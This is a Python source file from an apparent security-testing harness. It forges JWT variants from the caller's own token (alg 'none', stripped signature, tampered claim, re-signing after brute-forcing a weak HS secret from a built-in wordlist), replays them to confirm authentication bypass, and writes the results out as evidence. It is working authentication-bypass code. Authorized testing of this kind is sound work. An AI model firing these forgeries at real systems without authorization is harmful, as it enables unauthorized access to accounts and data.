#!/usr/bin/env python3
"""
jwt-confirm.py — the token-forgery oracle (Grimnir confirmation harness).

Takes the caller's OWN valid JWT and a protected endpoint the token opens, produces forged variants,
replays each, and confirms a bypass when the server ACCEPTS a forgery (same success status as the
real token). The oracle is acceptance vs rejection — no judgment. It needs only one credential we
already hold (our token), so it is auto-fireable on a read-only endpoint.

Forgeries (each a token a correct verifier MUST reject):
  alg_none       header alg -> "none", signature stripped. Accepted => the signature is not verified.
  sig_stripped   original header, empty signature. Accepted => same, without touching alg.
  tampered_claim a benign claim added, ORIGINAL signature kept. Accepted => decode-without-verify.
  weak_secret    (HS* only) if the original signature verifies under a common secret, re-sign a
                 tampered token with it. Accepted => the signing key is guessable.

Positive-control guard (mirrors authz-confirm): if the REAL token does not return the success status
the endpoint is unavailable to us and a "negative" would be false — downgrade to inconclusive.

  jwt-confirm.py --finding-id FINDING-011 --project-dir ~/workspace/prog \
     --method GET --url 'https://api/me' -H 'Authorization: Bearer eyJ...' [--success-status 200]

Writes evidence/<id>/jwt.json. Zero LLM; stdlib only (no external JWT library). The forged tokens are
built from OUR token; nothing here targets another principal's data — escalating a forged claim to
reach another tenant is a separate, human step.
"""
import argparse
import base64
import hashlib
import hmac
import json
import os
import re
import subprocess
import sys
from datetime import datetime, timezone

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import _pace  # noqa: E402  RoE pacing around every live request (sibling module)
import egress as _egress  # noqa: E402  the program's egress proxy: every request rides it or refuses

# A small, deterministic list of secrets that show up in tutorials, boilerplate, and leaked configs.
# Precision over breadth: a hit here is a real weak-key finding, and the list stays fast.
WEAK_SECRETS = [
    "secret", "password", "changeme", "jwt", "jwtsecret", "jwt_secret", "key", "private",
    "your-256-bit-secret", "your_jwt_secret", "supersecret", "test", "admin", "123456",
    "secretkey", "mysecret", "s3cr3t", "token", "default", "qwerty",
]


def _b64url_decode(seg: str) -> bytes:
    seg = seg.strip()
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def _b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def decode_jwt(token: str):
    """(header, payload, signature_segment) or None. Header/payload are dicts; signature is the raw
    3rd base64url segment (may be empty)."""
    parts = (token or "").split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
    except (ValueError, json.JSONDecodeError):
        return None
    if not isinstance(header, dict) or not isinstance(payload, dict):
        return None
    return header, payload, parts[2]


def _encode(header: dict, payload: dict, sig: str = "") -> str:
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{sig}"


def forge_alg_none(token: str) -> str | None:
    d = decode_jwt(token)
    if not d:
        return None
    header, payload, _ = d
    return _encode({**header, "alg": "none"}, payload, "")


def forge_sig_stripped(token: str) -> str | None:
    d = decode_jwt(token)
    if not d:
        return None
    header, payload, _ = d
    return _encode(header, payload, "")   # alg untouched, signature emptied


def forge_tampered_claim(token: str) -> str | None:
    """Add a benign marker claim while KEEPING the original signature. A correct verifier rejects it
    (the signature no longer matches); acceptance means the server decoded without verifying."""
    d = decode_jwt(token)
    if not d:
        return None
    header, payload, sig = d
    return _encode(header, {**payload, "gnf": 1}, sig)


def _signing_input(header: dict, payload: dict) -> bytes:
    return (_b64url_encode(json.dumps(header, separators=(",", ":")).encode()) + "." +
            _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())).encode()


def find_weak_secret(token: str, wordlist=None) -> str | None:
    """If the token is HS256/384/512 and its ORIGINAL signature verifies under a common secret, return
    that secret. Verifies the real signature so there is no re-sign guesswork in the check itself."""
    d = decode_jwt(token)
    if not d:
        return None
    header, payload, sig = d
    alg = str(header.get("alg", "")).upper()
    algo = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}.get(alg)
    if not algo or not sig:
        return None
    try:
        want = _b64url_decode(sig)
    except Exception:
        return None
    parts = token.split(".")
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    for secret in (wordlist or WEAK_SECRETS):
        mac = hmac.new(secret.encode(), signing_input, algo).digest()
        if hmac.compare_digest(mac, want):
            return secret
    return None


def resign_hs(token: str, secret: str) -> str | None:
    """Re-sign a tampered payload with a known secret (HS256). Used only after find_weak_secret."""
    d = decode_jwt(token)
    if not d:
        return None
    header, payload, _ = d
    header = {**header, "alg": "HS256"}
    payload = {**payload, "gnf": 1}
    si = _signing_input(header, payload)
    sig = _b64url_encode(hmac.new(secret.encode(), si, hashlib.sha256).digest())
    return f"{_b64url_encode(json.dumps(header, separators=(',', ':')).encode())}." \
           f"{_b64url_encode(json.dumps(payload, separators=(',', ':')).encode())}.{sig}"


def classify_jwt(own_status: int, success: int, variant_status: dict) -> tuple[str, str, list]:
    """Pure verdict. Accepted forgery (== success status) while the real token also succeeds is
    confirmed. If the real token did not reach the success status, the positive control failed and a
    'negative' would be false -> inconclusive."""
    accepted = [name for name, st in variant_status.items() if st == success]
    if own_status != success:
        return ("inconclusive",
                f"positive control failed: real token returned {own_status} (expected {success}) — "
                f"cannot conclude; establish working access and re-test", accepted)
    if accepted:
        return "confirmed", f"forged token(s) accepted ({success}): {', '.join(accepted)}", accepted
    return "negative", "every forged token was rejected — signature/verification holds", accepted


# ── request + orchestration ────────────────────────────────────────────────────
_AUTH_RE = re.compile(r"^(authorization)\s*:\s*(bearer\s+)?(\S+)\s*$", re.I)


def extract_jwt(headers: list[str]) -> str | None:
    for h in headers:
        m = _AUTH_RE.match(h)
        if m and decode_jwt(m.group(3)):
            return m.group(3)
    return None


def replace_token(headers: list[str], new_jwt: str) -> list[str]:
    out = []
    for h in headers:
        m = _AUTH_RE.match(h)
        if m:
            scheme = m.group(2) or "Bearer "
            out.append(f"Authorization: {scheme.strip()} {new_jwt}")
        else:
            out.append(h)
    return out


def _status(method: str, url: str, headers: list[str]) -> int:
    cmd = ["curl", "-sS", "-g", "-m", "20", "-o", os.devnull, "-w", "%{http_code}", "-X", method]
    cmd += _egress.curl_args(_egress.proxy())
    for h in headers:
        cmd += ["-H", h]
    cmd += [url]
    _pace.before(url)
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=30).stdout
        code = int(re.sub(r"\D", "", out or "0") or 0)
        _pace.after(url, code)
        return code
    except Exception:
        return 0


def main() -> int:
    ap = argparse.ArgumentParser(prog="jwt-confirm.py")
    ap.add_argument("--finding-id", required=True)
    ap.add_argument("--project-dir", required=True)
    ap.add_argument("--method", default="GET")
    ap.add_argument("--url", required=True)
    ap.add_argument("-H", "--header", action="append", default=[], dest="headers")
    ap.add_argument("--success-status", type=int, default=200)
    a = ap.parse_args()
    _pace.init(a.project_dir)
    _egress.init(a.project_dir)   # roe.json's proxy applies to a CLI run, not just a lane's env

    def write(verdict, why, extra=None):
        rec = {"schema": 1, "finding_id": a.finding_id, "vuln_class": "jwt",
               "verdict": verdict, "why": why, "ts": datetime.now(timezone.utc).isoformat()}
        if extra:
            rec.update(extra)
        d = os.path.join(a.project_dir, "evidence", a.finding_id)
        os.makedirs(d, exist_ok=True)
        json.dump(rec, open(os.path.join(d, "jwt.json"), "w"), indent=2)
        print(json.dumps({"finding_id": a.finding_id, "verdict": verdict, "why": why}, indent=2))
        print(f"wrote {d}/jwt.json")

    token = extract_jwt(a.headers)
    if not token:
        write("inconclusive", "no decodable JWT in the Authorization header — nothing to forge")
        return 0

    own = _status(a.method.upper(), a.url, a.headers)
    forgeries = {"alg_none": forge_alg_none(token),
                 "sig_stripped": forge_sig_stripped(token),
                 "tampered_claim": forge_tampered_claim(token)}
    secret = find_weak_secret(token)
    if secret:
        forgeries["weak_secret"] = resign_hs(token, secret)

    variant_status = {}
    for name, forged in forgeries.items():
        if not forged:
            continue
        variant_status[name] = _status(a.method.upper(), a.url, replace_token(a.headers, forged))

    verdict, why, accepted = classify_jwt(own, a.success_status, variant_status)
    extra = {"own_status": own, "success_status": a.success_status, "variant_status": variant_status,
             "accepted_variants": accepted, "negative_control": f"forged-token replay: {why}"}
    if secret:
        # Record only THAT the key was weak, never the key itself in a way that ships a live secret.
        extra["weak_secret_found"] = True
    write(verdict, why, extra)
    if own != a.success_status:
        print(f"  ! positive control weak: real token returned {own} (expected {a.success_status})",
              file=sys.stderr)
    return 0


if __name__ == "__main__":
    main()
